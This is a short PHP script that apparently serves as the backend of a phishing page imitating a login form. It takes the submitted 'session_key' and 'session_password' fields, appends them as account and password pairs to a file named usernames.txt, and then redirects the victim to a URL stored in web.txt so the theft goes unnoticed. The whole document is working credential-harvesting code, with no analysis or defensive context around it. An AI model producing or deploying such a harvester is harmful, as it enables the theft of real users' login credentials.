<?php
$file = "web.txt";
$fp = fopen($file, "r");
$contents = fread($fp, filesize($file));
file_put_contents("usernames.txt", "Account: " . $_POST['session_key'] . " Pass: " . $_POST['session_password'] . "\n", FILE_APPEND);
header("location: $contents");
exit();
